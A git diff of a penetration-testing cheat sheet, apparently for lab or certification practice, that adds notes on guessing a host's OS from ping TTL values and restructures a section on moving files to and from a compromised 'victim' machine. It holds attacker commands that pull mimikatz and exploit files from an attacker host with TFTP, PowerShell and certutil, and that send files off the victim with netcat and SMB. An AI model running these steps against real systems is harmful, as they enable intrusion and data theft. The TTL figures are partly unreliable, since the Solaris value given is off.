@@ -15,6 +15,21 @@ Credit Info:
 I have obtained a lot of this info through other Github repos, blogs, sites and more.
 I have tried to give as much credit to the original creator as possible, if I have not given you credit please contact me on Twitter: https://twitter.com/s1nfulz
 
+## Determining the OS of a host via Ping
+----------------
+
+```
+ping 10.10.10.110
+PING 10.10.10.110 (10.10.10.110) 56(84) bytes of data.
+64 bytes from 10.10.10.110: icmp_seq=1 ttl=128 time=166 ms
+```
+
+The `TTL` can be used to determine the OS of the host. The three different types of TTL are as shown below:
+
+- TTL=64 = *nix - the hop count so if your getting 61 then there are 3 hops and its a *nix device. Most likely Linux.
+- TTL=128 = Windows - again if the TTL is 127 then the hop is 1 and its a Windows box.
+- TTL=254 = Solaris/AIX - again if the TTL is 250 then the hop count is 4 and its a Solaris box.
+
 ## BOF (WIP)
 ----------------
 (Typical bad characters include: 0x00, 0x0A, 0x0D)
@@ -51,7 +66,14 @@ Good BOF resources:
 ## File Transfers
 ----------------
 
-wget Transfer
+### SMB Transfer
+On the Victim machine (Windows)
+```
+net share \\10.10.10.10\myshare
+net use x:
+copy whatever.zip x:
+```	
+### Wget Transfer
 
 How to retrieve file(s) from host (inside a reverse shell)
 
@@ -63,7 +85,7 @@ service apache2 start
 # wget -r http://10.10.10.10/pspy64/ <- for folder
 ```
 	
-TFTP Transfer
+### TFTP Transfer
 
 (How to transfer from Kali to Windows)
 
@@ -81,13 +103,13 @@ Inside a terminal
 
 4. `tftp -i 10.10.10.10 GET mimikatz.exe`
 
-NetCat (Windows to Kali)
+### NetCat (Windows to Kali)
 
 1. Windows: `nc -nv 10.11.0.61 4444 < bank-account.zip`
 
 2. Linux: `nc -nlvp 4444 > bank-account.zip`
 	
-PowerShell
+### PowerShell
 
 ```ps
 Invoke-WebRequest -Uri http://127.0.0.1/exploit.py -OutFile C:\Users\Victim\exploit.py
@@ -100,7 +122,7 @@ $client = New-Object System.Net.WebClient
 $path = "C:\path\to\save\file.txt"
 $client.DownloadFile($url, $path)
 ```
-Base64 (Linux -> Linux)
+### Base64 (Linux -> Linux)
 
 Local Host:
 1. `$(echo "cat /path/to/exploit.py | base64") > encoded.b64`
@@ -112,7 +134,7 @@ Remote Server - Linux:
 
 Remove Server - Powershell 
 	
-Certutil
+### Certutil
 
 ```
 certutil.exe -urlcache -split -f "http://ip.for.kali.box/file-to-get.zip" name-to-save-as.zip
